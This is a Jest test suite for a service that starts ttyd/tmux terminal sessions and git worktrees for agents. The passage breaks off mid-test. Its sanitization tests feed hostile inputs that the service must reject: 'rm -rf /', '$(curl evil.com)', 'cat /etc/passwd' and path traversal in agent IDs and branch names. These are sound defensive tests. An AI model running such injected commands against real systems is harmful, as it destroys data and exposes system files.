/* eslint-disable @typescript-eslint/no-explicit-any */
import { EventEmitter } from 'events';

// ---------------------------------------------------------------------------
// Mock child_process BEFORE importing the service.
// resolveBin() calls execSync('which <name>') at module load time.
// ---------------------------------------------------------------------------

const mockExecSync = jest.fn();
const mockExecFileSync = jest.fn();
const mockSpawn = jest.fn();

jest.mock('child_process', () => ({
  execSync: mockExecSync,
  execFileSync: mockExecFileSync,
  spawn: mockSpawn,
  ChildProcess: jest.fn(),
}));

const mockServerInstance = {
  once: jest.fn(),
  listen: jest.fn(),
  close: jest.fn(),
};
jest.mock('net', () => ({
  createServer: jest.fn(() => mockServerInstance),
}));

const mockExistsSync = jest.fn();
jest.mock('fs', () => ({
  existsSync: mockExistsSync,
}));

const mockFetch = jest.fn();
global.fetch = mockFetch;

// ---------------------------------------------------------------------------
// Configure resolveBin responses (called at module load)
// ---------------------------------------------------------------------------
mockExecSync.mockImplementation((cmd: string) => {
  if (cmd === 'which ttyd') return '/usr/local/bin/ttyd\n';
  if (cmd === 'which tmux') return '/usr/local/bin/tmux\n';
  if (cmd === 'which claude') return '/usr/local/bin/claude\n';
  if (cmd === 'which git') return '/usr/bin/git\n';
  return '';
});

import { resolve } from 'path';
import { TerminalService } from './terminal.service';
import { createMockPinoLogger } from '../../common/testing/mock-pino-logger';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Computes the expected worktree path for an agent, matching the service logic */
function expectedWorktreePath(agentId: string): string {
  const worktreeRoot = process.env.WORKTREE_ROOT
    ?? resolve(process.env.HOME ?? '/tmp', '.worktrees');
  return resolve(worktreeRoot, 'cenzontle', agentId);
}

function createMockProcess(): any {
  const proc = new EventEmitter() as any;
  proc.stdout = new EventEmitter();
  proc.stderr = new EventEmitter();
  proc.kill = jest.fn();
  proc.pid = 12345;
  return proc;
}

function simulateFreePort(): void {
  mockServerInstance.once.mockImplementation((event: string, cb: (...args: any[]) => void) => {
    if (event === 'listening') setTimeout(() => cb(), 0);
    return mockServerInstance;
  });
  mockServerInstance.close.mockImplementation((cb: () => void) => cb());
}

function simulateAllPortsBusy(): void {
  mockServerInstance.once.mockImplementation((event: string, cb: (...args: any[]) => void) => {
    if (event === 'error') setTimeout(() => cb(new Error('EADDRINUSE')), 0);
    return mockServerInstance;
  });
}

// ---------------------------------------------------------------------------
// Test suite
// ---------------------------------------------------------------------------

describe('TerminalService', () => {
  let service: TerminalService;

  beforeEach(() => {
    jest.clearAllMocks();
    service = new TerminalService(createMockPinoLogger());

    simulateFreePort();
    mockFetch.mockResolvedValue({ ok: true });
    mockSpawn.mockReturnValue(createMockProcess());

    mockExecSync.mockImplementation((cmd: string) => {
      if (cmd === 'which ttyd') return '/usr/local/bin/ttyd\n';
      if (cmd === 'which tmux') return '/usr/local/bin/tmux\n';
      if (cmd === 'which claude') return '/usr/local/bin/claude\n';
      if (cmd === 'which git') return '/usr/bin/git\n';
      return '';
    });

    mockExecFileSync.mockImplementation((_bin: string, args: string[]) => {
      const cmd = args.join(' ');
      if (cmd.includes('rev-parse --show-toplevel')) return '/repo/root\n';
      if (cmd.includes('rev-parse --verify')) throw new Error('branch not found');
      if (cmd.includes('worktree add')) return '';
      if (cmd.includes('worktree remove')) return '';
      // tmux display-message (copy-mode) — now uses execFileSync
      if (cmd.includes('display-message')) return '0';
      return '';
    });

    mockExistsSync.mockReturnValue(false);
  });

  // =========================================================================
  // Path sanitization
  // =========================================================================

  describe('sanitizeWorkdir', () => {
    it('rejects empty workdir', async () => {
      await expect(service.startSession('a1', '')).rejects.toThrow('workdir must not be empty');
    });

    it('rejects whitespace-only workdir', async () => {
      await expect(service.startSession('a1', '   ')).rejects.toThrow('workdir must not be empty');
    });

    it('rejects path traversal with ..', async () => {
      await expect(service.startSession('a1', '/tmp/../etc/passwd')).rejects.toThrow(
        'path traversal',
      );
    });

    it('accepts a valid absolute path', async () => {
      const result = await service.startSession('a1', '/tmp/valid-dir');
      expect(result.port).toBeGreaterThanOrEqual(7681);
    });
  });

  // =========================================================================
  // Agent ID sanitization (Tomas #1)
  // =========================================================================

  describe('sanitizeAgentId', () => {
    it('rejects agentId with shell injection semicolon', async () => {
      await expect(
        service.startSession('x; rm -rf /', '/tmp'),
      ).rejects.toThrow('Invalid agentId');
    });

    it('rejects agentId with $() command substitution', async () => {
      await expect(
        service.startSession('$(curl evil.com)', '/tmp'),
      ).rejects.toThrow('Invalid agentId');
    });

    it('rejects agentId with backtick execution', async () => {
      await expect(
        service.startSession('`id`', '/tmp'),
      ).rejects.toThrow('Invalid agentId');
    });

    it('rejects agentId with pipe', async () => {
      await expect(
        service.startSession('x|sh', '/tmp'),
      ).rejects.toThrow('Invalid agentId');
    });

    it('rejects agentId with spaces', async () => {
      await expect(
        service.startSession('agent 1', '/tmp'),
      ).rejects.toThrow('Invalid agentId');
    });

    it('rejects agentId with slashes (path traversal)', async () => {
      await expect(
        service.startSession('agent/../../etc', '/tmp'),
      ).rejects.toThrow('Invalid agentId');
    });

    it('rejects agentId with dots', async () => {
      await expect(
        service.startSession('agent.1', '/tmp'),
      ).rejects.toThrow('Invalid agentId');
    });

    it('rejects empty agentId', async () => {
      await expect(
        service.startSession('', '/tmp'),
      ).rejects.toThrow('agentId must not be empty');
    });

    it('rejects agentId exceeding 128 characters', async () => {
      const longId = 'a'.repeat(129);
      await expect(
        service.startSession(longId, '/tmp'),
      ).rejects.toThrow('must not exceed 128 characters');
    });

    it('accepts valid agentIds', async () => {
      const r1 = await service.startSession('agent-1', '/tmp');
      expect(r1.port).toBe(7681);

      const r2 = await service.startSession('Agent_2', '/tmp');
      expect(r2.port).toBe(7682);

      const r3 = await service.startSession('a1b2c3', '/tmp');
      expect(r3.port).toBe(7683);

      // 128 chars exactly is OK
      const r4 = await service.startSession('a'.repeat(128), '/tmp');
      expect(r4.port).toBe(7684);
    });

    it('sanitized agentId is used in tmux session name (not raw input)', async () => {
      await service.startSession('safe-agent', '/tmp/project');

      const shellCmd = mockSpawn.mock.calls[0][1].find(
        (arg: string) => typeof arg === 'string' && arg.includes('new-session'),
      );
      expect(shellCmd).toContain('forge-safe-agent');
    });
  });

  // =========================================================================
  // Branch sanitization
  // =========================================================================

  describe('sanitizeBranch', () => {
    it('rejects branch with shell injection semicolon', async () => {
      await expect(
        service.startSession('a1', '/tmp', undefined, 'feat/x; rm -rf /'),
      ).rejects.toThrow('Invalid branch name');
    });

    it('rejects branch with $() command substitution', async () => {
      await expect(
        service.startSession('a1', '/tmp', undefined, 'feat/$(whoami)'),
      ).rejects.toThrow('Invalid branch name');
    });

    it('rejects branch with backtick execution', async () => {
      await expect(
        service.startSession('a1', '/tmp', undefined, 'feat/`id`'),
      ).rejects.toThrow('Invalid branch name');
    });

    it('rejects branch with pipe', async () => {
      await expect(
        service.startSession('a1', '/tmp', undefined, 'feat/x|cat /etc/passwd'),
      ).rejects.toThrow('Invalid branch name');
    });

    it('rejects branch with && chaining', async () => {
      await expect(
        service.startSession('a1', '/tmp', undefined, 'feat/x&&evil'),
      ).rejects.toThrow('Invalid branch name');
    });

    it('rejects branch with spaces', async () => {
      await expect(
        service.startSession('a1', '/tmp', undefined, 'feat/my feature'),
      ).rejects.toThrow('Invalid branch name');
    });

    it('rejects branch with parentheses', async () => {
      await expect(
        service.startSession('a1', '/tmp', undefined, 'hotfix/CENZ-42(urgent)'),
      ).rejects.toThrow('Invalid branch name');
    });

    it('treats empty branch as no branch (no worktree created)', async () => {
      const result = await service.startSession('a1', '/tmp', undefined, '');
      expect(result.worktreePath).toBeNull();
    });

    it('rejects branch with .. (git ref pitfall)', async () => {
      await expect(
        service.startSession('a1', '/tmp', undefined, 'feat/a..b'),
      ).rejects.toThrow('forbidden git ref pattern');
    });

    it('rejects branch ending with .lock', async () => {
      await expect(
        service.startSession('a1', '/tmp', undefined, 'feat/branch.lock'),
      ).rejects.toThrow('forbidden git ref pattern');
    });

    it('rejects branch ending with /', async () => {
      await expect(
        service.startSession('a1', '/tmp', undefined, 'feat/trailing/'),
      ).rejects.toThrow('forbidden git ref pattern');
    });

    it('accepts valid branch names', async () => {
      const r1 = await service.startSession('a1', '/tmp', undefined, 'feat/CENZ-42');
      expect(r1.worktreePath).toBe(expectedWorktreePath('a1'));

      const r2 = await service.startSession('a2', '/tmp', undefined, 'release/v1.2.3');
      expect(r2.worktreePath).toBe(expectedWorktreePath('a2'));

      const r3 = await service.startSession('a3', '/tmp', undefined, 'fix/my_bug_fix');
      expect(r3.worktreePath).toBe(expectedWorktreePath('a3'));

      const r4 = await service.startSession('a4', '/tmp', undefined, 'user/jose/feat/auth');
      expect(r4.worktreePath).toBe(expectedWorktreePath('a4'));
    });
  });

  // =========================================================================
  // Port management
  // =========================================================================

  describe('port allocation', () => {
    it('allocates first free port starting from 7681', async () => {
      const { port } = await service.startSession('a1', '/tmp');
      expect(port).toBe(7681);
    });

    it('increments port for subsequent sessions', async () => {
      const r1 = await service.startSession('a1', '/tmp');
      const r2 = await service.startSession('a2', '/tmp');
      expect(r1.port).toBe(7681);
      expect(r2.port).toBe(7682);
    });

    it('skips busy ports', async () => {
      let callCount = 0;
      mockServerInstance.once.mockImplementation((event: string, cb: (...args: any[]) => void) => {
        if (callCount === 0) {
          if (event === 'error') setTimeout(() => cb(new Error('EADDRINUSE')), 0);
        } else {
          if (event === 'listening') setTimeout(() => cb(), 0);
        }
        callCount++;
        return mockServerInstance;
      });
      mockServerInstance.close.mockImplementation((cb: () => void) => cb());

      const { port } = await service.startSession('a1', '/tmp');
      expect(port).toBe(7682);
    });

    it('throws when all ports are exhausted', async () => {
      simulateAllPortsBusy();
      await expect(service.startSession('a1', '/tmp')).rejects.toThrow('No free ports');
    });

    it('does not recycle ports from stopped sessions', async () => {
      const r1 = await service.startSession('a1', '/tmp');
      expect(r1.port).toBe(7681);

      service.stopSession('a1');

      const r2 = await service.startSession('a2', '/tmp');
      expect(r2.port).toBe(7682);
    });
  });

  // =========================================================================
  // startSession — without branch
  // =========================================================================

  describe('startSession (no branch)', () => {
    it('spawns ttyd with correct arguments', async () => {
      await service.startSession('agent-1', '/tmp/project');

      expect(mockSpawn).toHaveBeenCalledWith(
        '/usr/local/bin/ttyd',
        expect.arrayContaining(['-W', '-p', '7681', '/bin/bash', '-c']),
        expect.objectContaining({ cwd: '/tmp/project' }),
      );
    });

    it('returns null worktreePath when no branch', async () => {
      const result = await service.startSession('agent-1', '/tmp/project');
      expect(result.worktreePath).toBeNull();
    });

    it('waits for ttyd readiness via fetch', async () => {
      await service.startSession('agent-1', '/tmp/project');
      expect(mockFetch).toHaveBeenCalledWith('http://127.0.0.1:7681', { method: 'HEAD' });
    });

    it('returns existing session if already active', async () => {
      const r1 = await service.startSession('agent-1', '/tmp/project');
      const r2 = await service.startSession('agent-1', '/tmp/other');

      expect(r1.port).toBe(r2.port);
      expect(mockSpawn).toHaveBeenCalledTimes(1);
    });

    it('includes tmux configuration in the shell command', async () => {
      await service.startSession('agent-1', '/tmp/project');

      const shellCmd = mockSpawn.mock.calls[0][1].find(
        (arg: string) => typeof arg === 'string' && arg.includes('new-session'),
      );
      expect(shellCmd).toContain('forge-agent-1');
      expect(shellCmd).toContain('history-limit 50000');
      expect(shellCmd).toContain('mouse on');
      expect(shellCmd).toContain('status off');
    });
  });

  // =========================================================================
  // startSession — with branch (worktree isolation)
  // =========================================================================

  describe('startSession (with branch)', () => {
    it('creates a new worktree when branch does not exist', async () => {
      const result = await service.startSession('agent-1', '/tmp/project', undefined, 'feat/CENZ-42');

      const worktreeAddCall = mockExecFileSync.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1].includes('worktree'),
      );
      expect(worktreeAddCall).toBeDefined();
      expect(worktreeAddCall![1]).toContain('-b');
      expect(worktreeAddCall![1]).toContain('feat/CENZ-42');
      expect(result.worktreePath).toBe(expectedWorktreePath('agent-1'));
    });

    it('checks out existing branch without -b flag', async () => {
      mockExecFileSync.mockImplementation((_bin: string, args: string[]) => {
        const cmd = args.join(' ');
        if (cmd.includes('rev-parse --show-toplevel')) return '/repo/root\n';
        if (cmd.includes('rev-parse --verify')) return 'abc123\n';
        if (cmd.includes('worktree add')) return '';
        return '';
      });

      await service.startSession('agent-1', '/tmp/project', undefined, 'feat/CENZ-42');

      const worktreeAddCall = mockExecFileSync.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1].includes('worktree') && call[1].includes('add'),
      );
      expect(worktreeAddCall![1]).not.toContain('-b');
      expect(worktreeAddCall![1]).toContain('feat/CENZ-42');
    });

    it('reuses existing worktree directory', async () => {
      mockExistsSync.mockReturnValue(true);

      const result = await service.startSession('agent-1', '/tmp/project', undefined, 'feat/CENZ-42');

      const worktreeAddCall = mockExecFileSync.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1].includes('worktree') && call[1].includes('add'),
      );
      expect(worktreeAddCall).toBeUndefined();
      expect(result.worktreePath).toBe(expectedWorktreePath('agent-1'));
    });

    it('spawns ttyd in worktree directory, not original workdir', async () => {
      await service.startSession('agent-1', '/tmp/project', undefined, 'feat/CENZ-42');

      const spawnCall = mockSpawn.mock.calls[0];
      expect(spawnCall[2].cwd).toContain('agent-1');
      expect(spawnCall[2].cwd).not.toBe('/tmp/project');
    });

    it('resolves repo root from workdir before creating worktree', async () => {
      await service.startSession('agent-1', '/tmp/project', undefined, 'feat/CENZ-42');

      const repoRootCall = mockExecFileSync.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1].includes('--show-toplevel'),
      );
      expect(repoRootCall).toBeDefined();
      expect(repoRootCall![2]).toEqual(expect.objectContaining({ cwd: '/tmp/project' }));
    });

    it('propagates error when git worktree add fails', async () => {
      mockExecFileSync.mockImplementation((_bin: string, args: string[]) => {
        const cmd = args.join(' ');
        if (cmd.includes('rev-parse --show-toplevel')) return '/repo/root\n';
        if (cmd.includes('rev-parse --verify')) throw new Error('not found');
        if (cmd.includes('worktree add')) {
          throw new Error('fatal: branch feat/locked is already checked out at /other/path');
        }
        return '';
      });

      await expect(
        service.startSession('a1', '/tmp', undefined, 'feat/locked'),
      ).rejects.toThrow('already checked out');
    });

    it('propagates error when getRepoRoot fails (not a git repo)', async () => {
      mockExecFileSync.mockImplementation((_bin: string, args: string[]) => {
        const cmd = args.join(' ');
        if (cmd.includes('rev-parse --show-toplevel')) {
          throw new Error('fatal: not a git repository');
        }
        return '';
      });

      await expect(
        service.startSession('a1', '/tmp', undefined, 'feat/x'),
      ).rejects.toThrow('not a git repository');
    });
  });

  // =========================================================================
  // Zombie session cleanup (Tomas #2)
  // =========================================================================

  describe('zombie session cleanup', () => {
    // These tests trigger the 8-second waitForTtyd timeout with real timers
    const WAIT_TIMEOUT = 12_000;

    it('removes session from map when waitForTtyd times out', async () => {
      mockFetch.mockRejectedValue(new Error('ECONNREFUSED'));

      await expect(
        service.startSession('agent-1', '/tmp/project'),
      ).rejects.toThrow('did not become ready');

      expect(service.getSession('agent-1')).toBeNull();
    }, WAIT_TIMEOUT);

    it('kills the ttyd process when waitForTtyd times out', async () => {
      const proc = createMockProcess();
      mockSpawn.mockReturnValueOnce(proc);
      mockFetch.mockRejectedValue(new Error('ECONNREFUSED'));

      await expect(
        service.startSession('agent-1', '/tmp/project'),
      ).rejects.toThrow('did not become ready');

      expect(proc.kill).toHaveBeenCalledWith('SIGTERM');
    }, WAIT_TIMEOUT);

    it('allows retrying startSession after zombie cleanup', async () => {
      const proc1 = createMockProcess();
      mockSpawn.mockReturnValueOnce(proc1);

      // First attempt: ttyd never starts
      mockFetch.mockRejectedValue(new Error('ECONNREFUSED'));
      await expect(
        service.startSession('agent-1', '/tmp/project'),
      ).rejects.toThrow('did not become ready');

      // Second attempt: ttyd starts fine
      mockFetch.mockResolvedValue({ ok: true });
      const result = await service.startSession('agent-1', '/tmp/project');

      expect(result.port).toBeDefined();
      expect(service.getSession('agent-1')).not.toBeNull();
    }, WAIT_TIMEOUT);
  });

  // =========================================================================
  // stopSession
  // =========================================================================

  describe('stopSession', () => {
    it('kills ttyd process and tmux session', async () => {
      const proc = createMockProcess();
      mockSpawn.mockReturnValueOnce(proc);

      await service.startSession('agent-1', '/tmp/project');
      service.stopSession('agent-1');

      expect(proc.kill).toHaveBeenCalledWith('SIGTERM');
      expect(mockSpawn).toHaveBeenCalledWith(
        '/usr/local/bin/tmux',
        ['kill-session', '-t', 'forge-agent-1'],
        { stdio: 'ignore' },
      );
    });

    it('removes session from internal map', async () => {
      await service.startSession('agent-1', '/tmp/project');
      expect(service.getSession('agent-1')).not.toBeNull();

      service.stopSession('agent-1');
      expect(service.getSession('agent-1')).toBeNull();
    });

    it('is safe to call with non-existent agentId', () => {
      expect(() => service.stopSession('ghost')).not.toThrow();
    });

    it('does NOT remove worktree by default', async () => {
      await service.startSession('agent-1', '/tmp/project', undefined, 'feat/CENZ-42');
      service.stopSession('agent-1');

      const removeCall = mockExecFileSync.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1].includes('remove'),
      );
      expect(removeCall).toBeUndefined();
    });

    it('removes worktree when removeWorktreeOnStop is true', async () => {
      await service.startSession('agent-1', '/tmp/project', undefined, 'feat/CENZ-42');
      mockExistsSync.mockReturnValue(true);

      service.stopSession('agent-1', true);

      const removeCall = mockExecFileSync.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1].includes('remove') && call[1].includes('--force'),
      );
      expect(removeCall).toBeDefined();
    });

    it('handles SIGTERM failure gracefully', async () => {
      const proc = createMockProcess();
      proc.kill.mockImplementation(() => {
        throw new Error('Process already dead');
      });
      mockSpawn.mockReturnValueOnce(proc);

      await service.startSession('agent-1', '/tmp/project');
      expect(() => service.stopSession('agent-1')).not.toThrow();
    });

    it('uses session.agentId (sanitized) for tmux kill-session, not raw param', async () => {
      await service.startSession('agent-1', '/tmp/project');
      mockSpawn.mockClear();

      service.stopSession('agent-1');

      const killCall = mockSpawn.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1][0] === 'kill-session',
      );
      expect(killCall).toBeDefined();
      // The tmux session name should come from session.agentId, not the raw param
      expect(killCall![1]).toEqual(['kill-session', '-t', 'forge-agent-1']);
    });
  });

  // =========================================================================
  // Process crash cleanup
  // =========================================================================

  describe('process event handlers', () => {
    it('removes session from map when ttyd process emits error', async () => {
      const proc = createMockProcess();
      mockSpawn.mockReturnValueOnce(proc);

      await service.startSession('agent-1', '/tmp/project');
      expect(service.getSession('agent-1')).not.toBeNull();

      proc.emit('error', new Error('spawn ENOENT'));
      expect(service.getSession('agent-1')).toBeNull();
    });

    it('removes session from map when ttyd process exits unexpectedly', async () => {
      const proc = createMockProcess();
      mockSpawn.mockReturnValueOnce(proc);

      await service.startSession('agent-1', '/tmp/project');
      proc.emit('exit', 1, 'SIGKILL');
      expect(service.getSession('agent-1')).toBeNull();
    });

    it('removes session from map when ttyd exits with code 0', async () => {
      const proc = createMockProcess();
      mockSpawn.mockReturnValueOnce(proc);

      await service.startSession('agent-1', '/tmp/project');
      proc.emit('exit', 0, null);
      expect(service.getSession('agent-1')).toBeNull();
    });

    it('other sessions are unaffected when one process crashes', async () => {
      const proc1 = createMockProcess();
      const proc2 = createMockProcess();
      mockSpawn.mockReturnValueOnce(proc1).mockReturnValueOnce(proc2);

      await service.startSession('a1', '/tmp/p1');
      await service.startSession('a2', '/tmp/p2');

      proc1.emit('error', new Error('segfault'));

      expect(service.getSession('a1')).toBeNull();
      expect(service.getSession('a2')).not.toBeNull();
    });
  });

  // =========================================================================
  // Query methods
  // =========================================================================

  describe('getSession', () => {
    it('returns null for unknown agent', () => {
      expect(service.getSession('unknown')).toBeNull();
    });

    it('returns full session info including worktree fields', async () => {
      await service.startSession('agent-1', '/tmp/project', undefined, 'feat/CENZ-42');

      const session = service.getSession('agent-1');
      expect(session).toMatchObject({
        port: 7681,
        branch: 'feat/CENZ-42',
        url: 'http://localhost:7681',
      });
      expect(session!.worktreePath).toBe(expectedWorktreePath('agent-1'));
      expect(session!.startedAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
    });

    it('returns null branch and worktreePath for non-worktree sessions', async () => {
      await service.startSession('agent-1', '/tmp/project');

      const session = service.getSession('agent-1');
      expect(session!.branch).toBeNull();
      expect(session!.worktreePath).toBeNull();
    });
  });

  describe('getSessions', () => {
    it('returns empty array when no sessions', () => {
      expect(service.getSessions()).toEqual([]);
    });

    it('returns all active sessions', async () => {
      await service.startSession('a1', '/tmp/p1');
      await service.startSession('a2', '/tmp/p2', undefined, 'feat/X');

      const sessions = service.getSessions();
      expect(sessions).toHaveLength(2);

      const ids = sessions.map((s) => s.agentId).sort();
      expect(ids).toEqual(['a1', 'a2']);

      const withBranch = sessions.find((s) => s.agentId === 'a2');
      expect(withBranch!.branch).toBe('feat/X');
    });
  });

  // =========================================================================
  // isInCopyMode (Tomas #5: now uses execFileSync)
  // =========================================================================

  describe('isInCopyMode', () => {
    it('returns false for unknown agent', () => {
      expect(service.isInCopyMode('unknown')).toBe(false);
    });

    it('returns true when tmux reports pane_in_mode=1', async () => {
      mockExecFileSync.mockImplementation((_bin: string, args: string[]) => {
        const cmd = args.join(' ');
        if (cmd.includes('display-message')) return '1';
        if (cmd.includes('rev-parse --show-toplevel')) return '/repo\n';
        return '';
      });

      await service.startSession('agent-1', '/tmp/project');
      expect(service.isInCopyMode('agent-1')).toBe(true);
    });

    it('returns false when tmux reports pane_in_mode=0', async () => {
      await service.startSession('agent-1', '/tmp/project');

      mockExecFileSync.mockImplementation((_bin: string, args: string[]) => {
        const cmd = args.join(' ');
        if (cmd.includes('display-message')) return '0';
        return '';
      });

      expect(service.isInCopyMode('agent-1')).toBe(false);
    });

    it('returns false when tmux command fails', async () => {
      await service.startSession('agent-1', '/tmp/project');

      mockExecFileSync.mockImplementation((_bin: string, args: string[]) => {
        if (args.includes('display-message')) throw new Error('tmux not running');
        return '';
      });

      expect(service.isInCopyMode('agent-1')).toBe(false);
    });

    it('uses execFileSync with array args, not execSync with string concat', async () => {
      await service.startSession('agent-1', '/tmp/project');
      mockExecFileSync.mockClear();
      mockExecSync.mockClear();

      service.isInCopyMode('agent-1');

      // Should use execFileSync (safe: array args, no shell)
      const tmuxCall = mockExecFileSync.mock.calls.find(
        (call: any[]) => call[0] === '/usr/local/bin/tmux',
      );
      expect(tmuxCall).toBeDefined();
      expect(tmuxCall![1]).toEqual(
        expect.arrayContaining(['display-message', '-t', 'forge-agent-1']),
      );

      // Should NOT use execSync for tmux (unsafe: string concat with shell)
      const shellTmuxCalls = mockExecSync.mock.calls.filter(
        (call: any[]) => typeof call[0] === 'string' && call[0].includes('display-message'),
      );
      expect(shellTmuxCalls).toHaveLength(0);
    });

    it('uses session.agentId (validated) not the raw parameter', async () => {
      await service.startSession('safe-agent', '/tmp/project');
      mockExecFileSync.mockClear();

      // Call with the same ID — should use session.agentId internally
      service.isInCopyMode('safe-agent');

      const tmuxCall = mockExecFileSync.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1].includes('display-message'),
      );
      expect(tmuxCall![1]).toContain('forge-safe-agent');
    });
  });

  // =========================================================================
  // sendKeys
  // =========================================================================

  describe('sendKeys', () => {
    it('does nothing for unknown agent', () => {
      service.sendKeys('unknown', 'q');
      const sendKeysCall = mockSpawn.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1][0] === 'send-keys',
      );
      expect(sendKeysCall).toBeUndefined();
    });

    it('sends literal keys to the correct tmux session', async () => {
      await service.startSession('agent-1', '/tmp/project');
      mockSpawn.mockClear();

      service.sendKeys('agent-1', 'q');

      expect(mockSpawn).toHaveBeenCalledWith(
        '/usr/local/bin/tmux',
        ['send-keys', '-l', '-t', 'forge-agent-1', 'q'],
        expect.objectContaining({ stdio: 'ignore' }),
      );
    });

    it('sends long text paths correctly', async () => {
      await service.startSession('agent-1', '/tmp/project');
      mockSpawn.mockClear();

      const longPath = ' /tmp/cenzontle-uploads/abc-123-image.png';
      service.sendKeys('agent-1', longPath);

      expect(mockSpawn).toHaveBeenCalledWith(
        '/usr/local/bin/tmux',
        ['send-keys', '-l', '-t', 'forge-agent-1', longPath],
        expect.anything(),
      );
    });

    it('uses session.agentId (sanitized) for tmux session name, not raw param', async () => {
      await service.startSession('safe-agent', '/tmp/project');
      mockSpawn.mockClear();

      service.sendKeys('safe-agent', 'test');

      const sendCall = mockSpawn.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1][0] === 'send-keys',
      );
      expect(sendCall![1]).toContain('forge-safe-agent');
    });
  });

  // =========================================================================
  // onModuleDestroy
  // =========================================================================

  describe('onModuleDestroy', () => {
    it('stops all active sessions', async () => {
      const proc1 = createMockProcess();
      const proc2 = createMockProcess();
      mockSpawn.mockReturnValueOnce(proc1).mockReturnValueOnce(proc2);

      await service.startSession('a1', '/tmp/p1');
      await service.startSession('a2', '/tmp/p2');

      expect(service.getSessions()).toHaveLength(2);

      service.onModuleDestroy();

      expect(proc1.kill).toHaveBeenCalledWith('SIGTERM');
      expect(proc2.kill).toHaveBeenCalledWith('SIGTERM');
      expect(service.getSessions()).toHaveLength(0);
    });

    it('is safe to call with no sessions', () => {
      expect(() => service.onModuleDestroy()).not.toThrow();
    });
  });

  // =========================================================================
  // waitForTtyd
  // =========================================================================

  describe('waitForTtyd', () => {
    it('retries when fetch fails initially', async () => {
      let callCount = 0;
      mockFetch.mockImplementation(() => {
        callCount++;
        if (callCount < 3) return Promise.reject(new Error('ECONNREFUSED'));
        return Promise.resolve({ ok: true });
      });

      const result = await service.startSession('agent-1', '/tmp/project');
      expect(result.port).toBe(7681);
      expect(callCount).toBeGreaterThanOrEqual(3);
    });
  });

  // =========================================================================
  // Full lifecycle integration
  // =========================================================================

  describe('full lifecycle', () => {
    it('start → query → stop cycle works end-to-end', async () => {
      const { port, worktreePath } = await service.startSession(
        'agent-x',
        '/tmp/project',
        undefined,
        'feat/CENZ-99',
      );

      expect(port).toBe(7681);
      expect(worktreePath).toBe(expectedWorktreePath('agent-x'));

      const session = service.getSession('agent-x');
      expect(session!.branch).toBe('feat/CENZ-99');
      expect(session!.worktreePath).toBe(worktreePath);

      const all = service.getSessions();
      expect(all).toHaveLength(1);

      mockSpawn.mockClear();
      service.sendKeys('agent-x', 'q');
      expect(mockSpawn).toHaveBeenCalled();

      service.stopSession('agent-x');
      expect(service.getSession('agent-x')).toBeNull();
    });

    it('two agents on different branches coexist', async () => {
      const r1 = await service.startSession('a1', '/tmp/project', undefined, 'feat/auth');
      const r2 = await service.startSession('a2', '/tmp/project', undefined, 'feat/search');

      expect(r1.port).not.toBe(r2.port);
      expect(r1.worktreePath).not.toBe(r2.worktreePath);

      expect(service.getSession('a1')!.branch).toBe('feat/auth');
      expect(service.getSession('a2')!.branch).toBe('feat/search');
      expect(service.getSessions()).toHaveLength(2);

      service.stopSession('a1');
      expect(service.getSession('a1')).toBeNull();
      expect(service.getSession('a2')).not.toBeNull();
    });

    it('no user input reaches shell without sanitization', async () => {
      await service.startSession('agent-1', '/tmp/project', undefined, 'feat/safe');

      const gitCalls = mockExecFileSync.mock.calls.filter(
        (call: any[]) => call[0] === '/usr/bin/git',
      );
      expect(gitCalls.length).toBeGreaterThanOrEqual(2);

      const shellGitCalls = mockExecSync.mock.calls.filter(
        (call: any[]) => typeof call[0] === 'string' && call[0].includes('/usr/bin/git'),
      );
      expect(shellGitCalls).toHaveLength(0);

      mockExecSync.mockClear();
      service.isInCopyMode('agent-1');
      const shellTmuxCalls = mockExecSync.mock.calls.filter(
        (call: any[]) => typeof call[0] === 'string' && call[0].includes('tmux'),
      );
      expect(shellTmuxCalls).toHaveLength(0);
    });

    it('session stores sanitized branch, not raw input', async () => {
      // Branch is valid and passes through unchanged — but session stores the
      // value that went through sanitizeBranch, not the raw parameter
      await service.startSession('agent-1', '/tmp/project', undefined, 'feat/CENZ-42');

      const session = service.getSession('agent-1');
      expect(session!.branch).toBe('feat/CENZ-42');
      // Confirm it's not null (would be null if safeBranch wasn't stored)
      expect(session!.branch).not.toBeNull();
    });

    it('all methods use session.agentId consistently (not raw param)', async () => {
      await service.startSession('agent-1', '/tmp/project');

      // stopSession → tmux kill-session uses session.agentId
      mockSpawn.mockClear();
      service.stopSession('agent-1');
      const killCall = mockSpawn.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1][0] === 'kill-session',
      );
      expect(killCall![1][2]).toBe('forge-agent-1');

      // Start a new session for sendKeys + isInCopyMode tests
      await service.startSession('agent-2', '/tmp/project');

      // sendKeys → tmux send-keys uses session.agentId
      mockSpawn.mockClear();
      service.sendKeys('agent-2', 'x');
      const sendCall = mockSpawn.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1][0] === 'send-keys',
      );
      expect(sendCall![1][3]).toBe('forge-agent-2');

      // isInCopyMode → tmux display-message uses session.agentId
      mockExecFileSync.mockClear();
      service.isInCopyMode('agent-2');
      const displayCall = mockExecFileSync.mock.calls.find(
        (call: any[]) => Array.isArray(call[1]) && call[1].includes('display-message'),
      );
      expect(displayCall![1][2]).toBe('forge-agent-2');
    });
  });

  // =========================================================================
  // WORKDIR_ROOT restriction (Raymundo #3 — module-level env config)
  // =========================================================================

  describe('WORKDIR_ROOT restriction', () => {
    const origEnv = process.env.AGENT_WORKDIR_ROOT;

    afterEach(() => {
      // Restore env
      if (origEnv === undefined) {
        delete process.env.AGENT_WORKDIR_ROOT;
      } else {
        process.env.AGENT_WORKDIR_ROOT = origEnv;
      }
      // Reset module cache so the main suite's import is unaffected
      jest.resetModules();
    });

    it('rejects workdir outside allowed root when AGENT_WORKDIR_ROOT is set', async () => {
      process.env.AGENT_WORKDIR_ROOT = '/allowed';
      jest.resetModules();

